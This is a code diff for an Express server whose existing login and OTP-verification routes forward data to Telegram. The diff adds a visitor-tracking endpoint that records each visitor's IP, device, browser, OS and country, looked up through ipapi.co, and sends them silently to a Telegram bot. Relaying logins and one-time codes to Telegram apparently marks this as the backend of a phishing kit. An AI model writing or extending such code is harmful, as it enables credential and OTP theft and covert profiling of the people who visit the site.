@@ -1,7 +1,8 @@
 import type { Express } from "express";
 import { createServer, type Server } from "http";
 import { z } from "zod";
-import { notifyLogin, notifyOtpVerification } from "./telegram";
+import { notifyLogin, notifyOtpVerification, notifyVisitor } from "./telegram";
+import { UAParser } from "ua-parser-js";
 
 const loginSchema = z.object({
   email: z.string().min(1, "Email is required"),
@@ -65,6 +66,56 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
       console.error("OTP verification error:", error);
       res.status(500).json({ error: "OTP verification failed" });
+    }
+  });
+
+  // Visitor tracking endpoint
+  app.post("/api/track-visit", async (req, res) => {
+    try {
+      // Get IP address
+      const ip = (req.headers['x-forwarded-for'] as string)?.split(',')[0] || 
+                 req.socket.remoteAddress || 
+                 'Unknown';
+      
+      // Get page from request body
+      const { page } = req.body;
+      
+      // Parse User-Agent for device information
+      const userAgent = req.headers['user-agent'] || 'Unknown';
+      const parser = new UAParser(userAgent);
+      const result = parser.getResult();
+      
+      const device = result.device.type 
+        ? `${result.device.vendor || ''} ${result.device.model || ''} (${result.device.type})`.trim()
+        : 'Desktop/Unknown';
+      const browser = result.browser.name 
+        ? `${result.browser.name} ${result.browser.version || ''}`.trim()
+        : 'Unknown';
+      const os = result.os.name 
+        ? `${result.os.name} ${result.os.version || ''}`.trim()
+        : 'Unknown';
+      
+      // Get country from IP using ipapi.co
+      let country = 'Unknown';
+      try {
+        const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+        if (geoResponse.ok) {
+          const geoData = await geoResponse.json();
+          country = geoData.country_name || geoData.country || 'Unknown';
+        }
+      } catch (error) {
+        console.error("Failed to get geolocation:", error);
+      }
+      
+      // Send notification to Telegram (fire and forget - don't block response)
+      notifyVisitor(ip, country, device, browser, os, page || 'Unknown').catch(err => {
+        console.error("Failed to notify visitor:", err);
+      });
+      
+      res.json({ success: true });
+    } catch (error) {
+      console.error("Visitor tracking error:", error);
+      res.json({ success: false }); // Always return success to not block frontend
     }
   });
 
